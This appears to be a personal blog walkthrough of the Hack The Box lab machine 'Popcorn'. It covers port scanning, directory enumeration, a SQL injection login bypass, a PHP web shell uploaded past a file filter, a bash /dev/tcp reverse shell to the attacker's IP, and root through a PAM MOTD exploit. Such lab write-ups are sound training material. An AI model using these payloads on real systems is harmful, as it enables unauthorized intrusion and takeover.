@@ -1,0 +1,215 @@
+---
+layout: default
+---
+<html>
+<head>
+    <title>Popcorn Walkthrough</title>
+    <a href="https://pusher91.github.io/Hacking/">Return to Main Page</a>
+</head>
+
+<body>
+    
+    <h1>Popcorn Walkthrough</h1>
+    
+    <hr>
+    
+    <h2>Contents</h2>
+    <ul>
+        <li><a href="#summary">Summary</a></li>
+        <li><a href="#portscan">Port Scanning</a></li>
+        <li><a href="#infogather">Information Gathering</a></li>
+        <li><a href="#www-data">Shell - www-data</a></li>
+        <li><a href="#root">Shell - root</a></li>
+    </ul>
+    
+    <h2><a id="summary">Summary</a></h2>
+    
+    <p>After enumerating directories on the web server we find a torrent hosting website.  Using sql inejction we are able to login as root.  Once logged in I am able to upload a php web shell by bypassing an upload restriction filter.  Once on the box an interesting motd file is found in the user George's home directory.  This leads us to an exploit which gives us root shell.</p>
+    
+    <h2><a id="portscan">Port Scanning</a></h2>
+    
+    <li>Running a port scan against the full port range to determine which ones are open.</li>
+    
+    <pre>&#13;&#10;# Nmap 7.91 scan initiated Sat Oct 16 19:32:32 2021 as: nmap -p- -oN ping_tcp 10.129.36.23&#13;&#10;Nmap scan report for popcorn.htb (10.129.36.23)&#13;&#10;Host is up (0.045s latency).&#13;&#10;Not shown: 65533 closed ports&#13;&#10;PORT   STATE SERVICE&#13;&#10;22/tcp open  ssh&#13;&#10;80/tcp open  http&#13;&#10;&#13;&#10;# Nmap done at Sat Oct 16 19:32:47 2021 -- 1 IP address (1 host up) scanned in 15.06 seconds&#13;&#10;    </pre>
+    
+    <li>Running an nmap scan using the flags -sV and -sC to enumerate service versions and other information.</li>
+    
+    <pre>&#13;&#10;# Nmap 7.91 scan initiated Sat Oct 16 19:33:08 2021 as: nmap -p22,80 -sV -sC -oN script_tcp 10.129.36.23&#13;&#10;Nmap scan report for popcorn.htb (10.129.36.23)&#13;&#10;Host is up (0.036s latency).&#13;&#10;&#13;&#10;PORT   STATE SERVICE VERSION&#13;&#10;22/tcp open  ssh     OpenSSH 5.1p1 Debian 6ubuntu2 (Ubuntu Linux; protocol 2.0)&#13;&#10;| ssh-hostkey: &#13;&#10;|   1024 3e:c8:1b:15:21:15:50:ec:6e:63:bc:c5:6b:80:7b:38 (DSA)&#13;&#10;|_  2048 aa:1f:79:21:b8:42:f4:8a:38:bd:b8:05:ef:1a:07:4d (RSA)&#13;&#10;80/tcp open  http    Apache httpd 2.2.12 ((Ubuntu))&#13;&#10;|_http-server-header: Apache/2.2.12 (Ubuntu)&#13;&#10;|_http-title: Site doesn&apos;t have a title (text/html).&#13;&#10;Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel&#13;&#10;&#13;&#10;Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .&#13;&#10;# Nmap done at Sat Oct 16 19:33:16 2021 -- 1 IP address (1 host up) scanned in 8.21 seconds&#13;&#10;    </pre>
+    
+    <br>
+    <h2><a id="infogather">Information Gathering</a></h2>
+
+    <li>I start off by visiting the web site on port 80.</li>
+
+    <img src="../images/popcorn/port80.png">
+
+    <br>
+    <br>
+
+    <li>There is nothing interesting on this page.  I also right click on the page and take a look at the source code.  Nothing interesting shows up there either.  The next step is to search for web directories.  I will use gobuster to do this.  I run the command: gobuster dir -u http://10.129.36.23 -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt | tee 10.129.36.23-raft.  After the scan finishes I use grep to exclude 403 responses.</li>
+
+    <img src="../images/popcorn/gobuster.png">
+
+    <br>
+    <br>
+
+    <li>The gobuster scan reveals 3 interesting directories.</li>
+    <ul>
+        <li>/test</li>
+        <ul>
+            <li>This directory brings us to the php info page.  This could come in handy.  However, it does not help us on this box.</li>
+        </ul>
+        
+        <li>/rename</li>
+        <ul>
+            <li>This brings us to an interesting page that allows us to rename files on the web server.  I was able to figure out how to rename the index.php page to something else but that did not help with anything.</li>
+        </ul>
+
+        <li>/torrent</li>
+        <ul>
+            <li>This page is interesting.  But it looks incomplete.  It looks like pictures are not loading correctly.</li>
+            <img src="../images/popcorn/torrent_1.png">
+            
+            <br>
+            <br>
+
+            <li>When I look at the source code I see http://popcorn.htb being referenced everywhere.  So I add this to my /etc/hosts file.</li>
+            <img src="../images/popcorn/popcorn.htb.png">
+
+            <br>
+            <br>
+
+            <img src="../images/popcorn/hosts.png">
+        </ul>
+    </ul>
+
+    <li>Now that /torrrent is showing correctly we can move on to gaining a foothold.</li>
+
+    <img src="../images/popcorn/torrent.png">
+
+    <br>
+    <br>
+
+    <h2><a id="www-data">Shell - www-data</a></h2>
+
+    <li>At this point, we can either click on sign up under the login form and create a user or do a simple sql injection to get admin access.  If you create your own user then you will need to upload a torrent file in order to gain a foothold (this will make more sense in a couple more steps).  I choose to login as admin using 'or 1=1-- - for both the username and password.</li>
+
+    <img src="../images/popcorn/sql_injection.png">
+
+    <br>
+    <br>
+
+    <li>Then I click on "My Torrents".</li>
+    
+    <img src="../images/popcorn/my_torrents.png">
+
+    <br>
+    <br>
+
+    <li>On this page we find the torrent "Kali Linux" that belongs to us.</li>
+
+    <img src="../images/popcorn/kali_torrent.png">
+
+    <br>
+    <br>
+
+    <li>Clicking on the torrent brings us to a page where we can see statistics about the torrent as well as the button "Edit this torrent" that allows us to upload a screenshot for the torrent.</li>
+
+    <img src="../images/popcorn/edit_torrent.png">
+
+    <br>
+    <br>
+
+    <li>I click on "Edit this torrent" and am given a window where I can choose a file to upload.  We will use this functionality to gain a web shell.  If I select a jpg, jpeg, gif, or png file it will upload successfully.  However in order to gain a web shell we need to upload a php file.  One way we know this server runs php is because when we visit /rename it references index.php in order to access the API.  The problem we run into is that when simply selecting a php file to upload as a screenshot the web app rejects it saying "Invalid file".  We need to bypass this.</li>
+
+    <br>
+
+    <li>In order to bypass the file upload restriction I create my php web shell file but I name it shell.png instead of shell.php</li>
+
+    <img src="../images/popcorn/png_shell.png">
+
+    <br>
+    <br>
+
+    <li>Now, I upload this file as my screenshot for the Kali torrent.</li>
+
+    <img src="../images/popcorn/upload_shell.png">
+
+    <br>
+    <br>
+
+    <li>Before clicking "Submit Screenshot" I get burp suite setup to intercept the request.  Here is the intercepted POST request to upload the screenshot file.</li>
+
+    <img src="../images/popcorn/burp.png">
+
+    <br>
+    <br>
+
+    <li>The POST request includes the details for the file "shell.png" that I have selected to upload.  In order to bypass the upload restriction filter I will change the filneame from shell.png to shell.php.  The reason this allows us to bypass the upload restriction filter is because the "Content-Type" field is specifying it as "image/png".  Not all upload restriction filters work the same way, but in this case, having the "Content Type" set to "image/png" will allow us to upload a file that has php as an extension.  Here is the altered POST request before I forward the post request.</li>
+
+    <img src="../images/popcorn/altered_post.png">
+
+    <br>
+    <br>
+
+
+    <li>Now I turn burp's intercept off and go back to the "Kali Linux" torrent page.  It should show "Image File Not Found!" for the screenshot.</li>
+
+    <img src="../images/popcorn/image_not_found.png">
+
+    <br>
+    <br>
+
+    <li>Now I right click on the "Image File Not Found!" and select "Copy Link Location".  This copies the URL to my reverse shell, which is: http://popcorn.htb/torrent/upload/723bc28f9b6f924cca68ccdff96b6190566ca6b4.php.  I navigate to that page and set the command to whoami in order to test whether or not the web shell works.  In full, I navigate to http://popcorn.htb/torrent/upload/723bc28f9b6f924cca68ccdff96b6190566ca6b4.php?cmd=whoami.</li>
+
+    <img src="../images/popcorn/shell_proof.png">
+
+    <br>
+    <br>
+
+    <li>Seeing that it works, I now set a netcat listener on port 4444.  Then I intercept a web request to the web shell and set the command to bash -c 'bash -i >& /dev/tcp/10.10.14.83/4444 0>&1'.  I url encode this by highlighting the command and pressing ctrl + u.</li>
+
+    <img src="../images/popcorn/shell_request.png">
+
+    <br>
+    <br>
+
+    <li>My netcat receives a connection and I now have my reverse shell.</li>
+
+    <img src="../images/popcorn/reverse_shell.png">
+
+    <br>
+    <br>
+
+    <h2><a id="root">Shell - Root</a></h2>
+
+    <li>I visit the /home directory and find /george.  I look inside Georges home directory and find an unusual file - /home/george/.cache/motd.legal-displayed  Upon discovering this file I use searchsploit to look see if any exploits exist that have to do with this file.</li>
+
+    <img src="../images/popcorn/searchsploit.png">
+
+    <br>
+    <br>
+
+    <li>It looks like these 2 exploits reference the MOTD which is in the name of the file I found.  The exploits also reference "Linux PAM 1.1.0".  I check to see which version of PAM is installed on the victim.</li>
+
+    <img src="../images/popcorn/pam.png">
+
+    <br>
+    <br>
+
+    <li>The PAM version on the victim machine also matches the 2 exploits.  I download one of the exploits and transfer it to the victim.</li>
+
+    <img src="../images/popcorn/exploit_download_and_transfer.png">
+
+    <br>
+    <br>
+
+    <li>Now I execute the script.</li>
+
+    <img src="../images/popcorn/root_shell.png">
+
+    <li>Root shell achieved.</li>
+    
+</body>
+</html>
+
